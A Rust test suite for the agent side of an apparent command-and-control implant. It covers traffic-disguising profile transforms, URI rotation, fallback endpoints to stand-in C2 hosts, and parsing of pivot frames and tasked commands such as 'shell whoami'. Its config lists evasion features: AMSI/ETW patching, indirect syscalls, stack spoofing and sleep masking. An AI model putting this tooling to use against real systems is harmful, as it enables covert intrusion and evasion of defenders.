// tests/test_w3_http.rs
//
// Wave-3 HTTP-mode profile parity tests (agent side):
//  profile transforms/headers application helpers (pure)
//  URI rotation with failure-aware stickiness (pure)
//  per-endpoint profile override selection (via FallbackManager)
//  transport-tag consistency validation at config load (pure)
//  poll-body / outbox classification for pivot frames (pure)

use rcm::agent::fallback::{validate_transport_consistency, FallbackManager};
use rcm::agent::http_transport::{
    apply_body_transform, classify_outbound, reverse_body_transform, split_inbound,
    OutboundItem, UriRotator,
};
use rcm::common::{
    C2Config, CommandResponse, FallbackConfig, FallbackEndpoint, FallbackStrategy,
    MalleableProfile, PivotFrame, ProxyConfig, SecuredCommand, TransformStep,
    TransportProtocol,
};

// ── Scaffolding ─────────────────────────────────────────────────────────────

fn test_config(transport: TransportProtocol, eps: Vec<FallbackEndpoint>) -> C2Config {
    C2Config {
        transport,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig { endpoints: eps, strategy: FallbackStrategy::Priority, dead_time_secs: 5 },
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: "primary.example".into(),
        build_id: "test-build".into(),
        tunnel_port: 4443,
        sleep_interval: 5,
        jitter_min: 0,
        jitter_max: 0,
        bloat_mb: 0,
        debug: false,
        kill_date: None,
        challenge_key: String::new(),
        sni_override: None,
        alpn_protocols: vec![],
        hibernation_mode: false,
        task_batch_size: 10,
        dga: None,
        valid_parents: Vec::new(),
        sleep_mask: "ekko".to_string(),
        indirect_syscalls: true,
        stack_spoof: true,
        patch_amsi_etw: true,
        heap_encrypt: true,
        guard_domain: String::new(),
        guard_hostname: String::new(),
        guard_hour_start: 0,
        guard_hour_end: 0,
        guard_no_system: false,
        auto_pivot_port: None,
    }
}

fn ep(host: &str, port: u16, transport: TransportProtocol, profile: Option<MalleableProfile>) -> FallbackEndpoint {
    FallbackEndpoint {
        host: host.into(), port, priority: 0,
        transport, profile, proxy: None,
        weight: 1, max_failures: 3,
    }
}

fn profile_with_uris(get_uris: &[&str], post_uris: &[&str]) -> MalleableProfile {
    let mut p = MalleableProfile::default();
    p.http_get.uris = get_uris.iter().map(|s| s.to_string()).collect();
    p.http_post.uris = post_uris.iter().map(|s| s.to_string()).collect();
    p
}

// ──transform helpers ──────────────────────────────────────────────────

#[test]
fn transform_empty_steps_is_identity() {
    let data = b"{\"hello\":\"world\"}";
    assert_eq!(apply_body_transform(data, &[]), data);
    assert_eq!(reverse_body_transform(data, &[]).unwrap(), data);
}

#[test]
fn transform_base64_roundtrip() {
    let steps = vec![TransformStep::Base64];
    let enc = apply_body_transform(b"command json", &steps);
    assert_eq!(enc, b"Y29tbWFuZCBqc29u".to_vec());
    // Decode tolerates embedded whitespace (mirrors DataMolder).
    let padded = b"Y29t bWFuZCBq\nc29u".to_vec();
    assert_eq!(reverse_body_transform(&padded, &steps).unwrap(), b"command json");
}

#[test]
fn transform_hex_roundtrip() {
    let steps = vec![TransformStep::Hex];
    let enc = apply_body_transform(b"\x01\x02\xab", &steps);
    assert_eq!(enc, b"0102ab".to_vec());
    assert_eq!(reverse_body_transform(&enc, &steps).unwrap(), b"\x01\x02\xab");
}

#[test]
fn transform_mask_roundtrip_and_empty_key() {
    let steps = vec![TransformStep::Mask(b"k3y".to_vec())];
    let enc = apply_body_transform(b"secret", &steps);
    assert_ne!(enc, b"secret");
    assert_eq!(reverse_body_transform(&enc, &steps).unwrap(), b"secret");
    // An empty mask key is a no-op in both directions.
    let noop = vec![TransformStep::Mask(vec![])];
    assert_eq!(apply_body_transform(b"secret", &noop), b"secret");
}

#[test]
fn transform_prepend_append_roundtrip_and_mismatch() {
    let steps = vec![
        TransformStep::Prepend("MAGIC:".into()),
        TransformStep::Append(":END".into()),
    ];
    let enc = apply_body_transform(b"body", &steps);
    assert_eq!(enc, b"MAGIC:body:END".to_vec());
    assert_eq!(reverse_body_transform(&enc, &steps).unwrap(), b"body");
    assert!(reverse_body_transform(b"body:END", &steps).is_err(), "missing prepend must fail");
    assert!(reverse_body_transform(b"MAGIC:body", &steps).is_err(), "missing append must fail");
}

#[test]
fn transform_chain_applies_in_order_and_reverses() {
    let steps = vec![
        TransformStep::Base64,
        TransformStep::Prepend("data=".into()),
    ];
    let enc = apply_body_transform(b"abc", &steps);
    assert_eq!(enc, b"data=YWJj".to_vec());
    assert_eq!(reverse_body_transform(&enc, &steps).unwrap(), b"abc");
}

// ──URI rotation ───────────────────────────────────────────────────────

#[test]
fn rotator_falls_back_when_profile_has_no_uris() {
    // HttpBlock::default() ships ["/default"]; empty sets are required to
    // exercise the true no-URI fallback path.
    let mut p = MalleableProfile::default();
    p.http_get.uris.clear();
    p.http_post.uris.clear();
    let r = UriRotator::new();
    assert_eq!(r.poll_uri(&p), "/api/v1/sync");
    assert_eq!(r.result_uri(&p), "/api/v1/sync");
}

#[test]
fn rotator_round_robin_advances_only_on_success() {
    let p = profile_with_uris(&["/a", "/b", "/c"], &["/p"]);
    let mut r = UriRotator::new();

    assert_eq!(r.poll_uri(&p), "/a");
    // No success note: the rotator sticks (failures are connection-level,
    // not URI-level, so retrying the same URI is correct).
    assert_eq!(r.poll_uri(&p), "/a");

    r.note_poll_ok(&p);
    assert_eq!(r.poll_uri(&p), "/b");
    r.note_poll_ok(&p);
    assert_eq!(r.poll_uri(&p), "/c");
    r.note_poll_ok(&p);
    assert_eq!(r.poll_uri(&p), "/a", "rotation wraps");

    // GET and POST rotations are independent.
    assert_eq!(r.result_uri(&p), "/p");
    r.note_result_ok(&p);
    assert_eq!(r.result_uri(&p), "/p", "single-URI set never moves");
    assert_eq!(r.poll_uri(&p), "/a");
}

// ──per-endpoint profile override ─────────────────────────────────────

#[test]
fn endpoint_profile_override_wins_over_global() {
    let mut override_profile = MalleableProfile::default();
    override_profile.user_agent = "OverrideAgent/1.0".into();

    let mut cfg = test_config(
        TransportProtocol::Https,
        vec![ep("a.example", 443, TransportProtocol::Https, Some(override_profile))],
    );
    cfg.profile.user_agent = "GlobalAgent/1.0".into();

    let mut mgr = FallbackManager::from_config(&cfg);
    let r = mgr.next_endpoint(&cfg).unwrap();
    assert_eq!(r.profile.user_agent, "OverrideAgent/1.0");
}

#[test]
fn endpoint_without_override_inherits_global_profile() {
    let mut cfg = test_config(
        TransportProtocol::Https,
        vec![ep("a.example", 443, TransportProtocol::Https, None)],
    );
    cfg.profile.user_agent = "GlobalAgent/1.0".into();

    let mut mgr = FallbackManager::from_config(&cfg);
    let r = mgr.next_endpoint(&cfg).unwrap();
    assert_eq!(r.profile.user_agent, "GlobalAgent/1.0");
}

// ──transport consistency validation ──────────────────────────────────

#[test]
fn http_build_accepts_http_family_endpoints() {
    let cfg = test_config(
        TransportProtocol::Https,
        vec![
            ep("a.example", 443, TransportProtocol::Https, None),
            ep("b.example", 80, TransportProtocol::Http, None),
        ],
    );
    assert!(validate_transport_consistency(&cfg).is_ok());
}

#[test]
fn http_build_rejects_stream_endpoint_with_honest_error() {
    let cfg = test_config(
        TransportProtocol::Https,
        vec![ep("a.example", 4443, TransportProtocol::Tls, None)],
    );
    let err = validate_transport_consistency(&cfg).unwrap_err();
    assert!(err.contains("a.example"), "error names the endpoint: {}", err);
    assert!(err.contains("mixed-transport"), "error explains the limit: {}", err);
}

#[test]
fn stream_build_rejects_http_endpoint() {
    let cfg = test_config(
        TransportProtocol::Tls,
        vec![ep("a.example", 443, TransportProtocol::Https, None)],
    );
    assert!(validate_transport_consistency(&cfg).is_err());
}

#[test]
fn stream_build_accepts_stream_family_endpoints() {
    let cfg = test_config(
        TransportProtocol::Tls,
        vec![
            ep("a.example", 4443, TransportProtocol::Tls, None),
            ep("b.example", 4444, TransportProtocol::TcpPlain, None),
            ep("c.example", 4445, TransportProtocol::NamedPipe, None),
        ],
    );
    assert!(validate_transport_consistency(&cfg).is_ok());
}

// ──pivot frame classification ─────────────────────────────────────────

fn sample_command() -> SecuredCommand {
    SecuredCommand {
        session_id: "sess-1".into(),
        counter: 7,
        nonce: 42,
        timestamp: chrono::Utc::now(),
        command: "shell whoami".into(),
        signature: "deadbeef".into(),
    }
}

fn sample_frame() -> PivotFrame {
    PivotFrame {
        stream_id: 3,
        destination: 2,
        source: 1,
        data: b"ping".to_vec(),
        metadata: String::new(),
    }
}

#[test]
fn split_inbound_separates_commands_and_pivot_frames() {
    let body = format!(
        "[{},{}]",
        serde_json::to_string(&sample_command()).unwrap(),
        serde_json::to_string(&sample_frame()).unwrap(),
    );
    let batch = split_inbound(body.as_bytes()).unwrap();
    assert_eq!(batch.commands.len(), 1);
    assert_eq!(batch.pivot_frames.len(), 1);
    assert_eq!(batch.commands[0].command, "shell whoami");
    assert_eq!(batch.pivot_frames[0].stream_id, 3);
}

#[test]
fn split_inbound_rejects_unrecognised_elements() {
    assert!(split_inbound(b"[{\"unexpected\":\"shape\"}]").is_err());
    assert!(split_inbound(b"not json").is_err());
}

#[test]
fn classify_outbound_detects_pivot_before_result() {
    let frame = serde_json::to_vec(&sample_frame()).unwrap();
    match classify_outbound(&frame) {
        Some(OutboundItem::Pivot(f)) => assert_eq!(f.stream_id, 3),
        _ => panic!("pivot frame must classify as Pivot"),
    }

    let resp = CommandResponse { request_id: 9, output: "ok".into(), error: String::new(), exit_code: 0 };
    let data = serde_json::to_vec(&resp).unwrap();
    match classify_outbound(&data) {
        Some(OutboundItem::Result(r)) => assert_eq!(r.request_id, 9),
        _ => panic!("command response must classify as Result"),
    }

    assert!(classify_outbound(b"garbage").is_none());
}
